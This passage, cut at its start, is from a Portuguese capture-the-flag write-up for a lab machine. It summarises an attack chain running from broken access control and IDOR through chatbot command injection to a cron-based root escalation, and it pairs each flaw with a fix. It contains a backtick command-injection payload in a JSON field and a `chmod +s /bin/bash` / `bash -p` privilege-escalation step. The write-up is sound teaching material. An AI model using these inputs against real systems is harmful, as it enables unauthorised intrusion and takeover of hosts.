-d '{"message":"`cat /tmp/rootflag.txt`"}'
```

```json
{"response": " hackingclub{225ffc37700e51a626c3dc553f1065e8}"}
```

> 🚩 **ROOT FLAG:** `hackingclub{225ffc37700e51a626c3dc553f1065e8}`
{: .prompt-tip }

---

## Resumo do Ataque

### Cadeia de exploração

```text
Recon (nmap: 22 SSH, 80 nginx -> retro.hc)
  └─> Enumeracao da API (ffuf: register, login, verify, chat)
       └─> Registro + login
            └─> Broken Access Control (JWT emitido ANTES do OTP; /dashboard so protegido no front)
                 └─> IDOR em /api/profile/{id}/ (vaza hash + PII de todos)
                      └─> Chatbot: BFLA (pagina 403, API aberta) + Command Injection (crase)
                           └─> RCE como appuser -> USER FLAG     [caminho realista, sem quebrar senha]
                           └─> (alternativo) quebrar hash do ronin -> login premium -> mesma RCE
                                └─> verification_rom.py roda .smc como root (cron)
                                     └─> recria /home/appuser/roms + planta .smc (chmod +s /bin/bash)
                                          └─> /bin/bash -p (euid=0) -> ROOT FLAG
```

### Tabela de Vulnerabilidades

| Vulnerabilidade | Impacto | Correção |
|---|---|---|
| JWT emitido antes da verificação OTP | 2FA inútil, sessão válida sem o 2º fator | Só emitir o token **depois** de validar o OTP no servidor |
| Controle de acesso ao `/dashboard` no client-side | Bypass de autenticação | Validar sessão e permissão **no backend**, em cada rota |
| IDOR em `/api/profile/{id}/` | Vazamento de hash de senha e PII de todos os usuários | Checar *ownership* (o usuário só acessa o **próprio** id) e nunca retornar o campo `password` |
| BFLA no `/api/chat/` | Função premium acessível por usuário Free | Aplicar autorização **na função/endpoint**, não só na página |
| Command Injection no chatbot | RCE como `appuser` | Não passar input pra shell, usar `subprocess` com lista de args e *allowlist* (blacklist falha) |
| `verification_rom.py` executando `.smc` como root | Escalação local para root | Não executar arquivos de diretório que o usuário controla, rodar com o **mínimo privilégio** |
| `roms` (do root) dentro da home do `appuser` | Permite recriar o diretório e plantar payload | Colocar recursos do root **fora** de diretórios cujo pai o usuário controla |
| Senha fraca (`kingkong`) e salt reutilizado | Hash de alto custo quebrado em segundos | Política de senha forte, salt único por usuário |

### Lições de segurança

Nenhuma falha sozinha "entregava o jogo", mas em série elas viram comprometimento total:

1. **Autenticação encenada.** OTP e login que existem na tela, mas não no servidor. Segurança que não é imposta no backend é decoração.
2. **Autorização ausente.** IDOR e BFLA são o mesmo erro de raiz: o servidor confia no que o cliente pede sem perguntar "você pode?".
3. **Input do usuário num shell**, com uma defesa por blacklist que sempre deixa um buraco (a crase).
4. **Menor privilégio violado.** Um script de root executando arquivos de uma pasta que o usuário controla. Bastava não rodar como root, ou validar a origem.

---

Flags capturadas:

1. **User flag:** `hackingclub{499623474d7463c261c8f48ddb427a9d}` (RCE como `appuser` no chatbot)
2. **Root flag:** `hackingclub{225ffc37700e51a626c3dc553f1065e8}` (SUID `/bin/bash` via cron + `.smc`)

Técnicas utilizadas:

- Enumeração de portas e de API (nmap, ffuf)
- Broken Access Control (JWT antes do OTP, controle client-side)
- IDOR (Insecure Direct Object Reference)
- BFLA (Broken Function Level Authorization)
- Command Injection com bypass de filtro de caracteres
- Quebra de hash Django PBKDF2-SHA256 (hashcat -m 10000)
- Abuso de cron + arquivo executável + SUID (`chmod +s /bin/bash`, `bash -p`)

### Referências

- [OWASP, Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP API Security Top 10 (BOLA/IDOR e BFLA)](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [hashcat, exemplos de modos de hash](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Django, armazenamento de senhas (PBKDF2)](https://docs.djangoproject.com/en/stable/topics/auth/passwords/)
- [GTFOBins, bash (SUID)](https://gtfobins.github.io/gtfobins/bash/)
- [PortSwigger, OS Command Injection](https://portswigger.net/web-security/os-command-injection)

---

**Nota final:**

A Retro é uma aula de que a maioria dos comprometimentos reais não vem de exploit exótico, e sim de uma sequência de decisões erradas de lógica: um 2FA que não trava nada, uma API que entrega o objeto de qualquer um, um filtro que esquece um caractere e um script de root rodando o que não devia. Resolver entendendo *por que* cada peça quebra é o que te faz enxergar o mesmo padrão num alvo real.

Se ficou com dúvida em qualquer parte, deixa um comentário. Bons estudos e happy hacking! 🔒
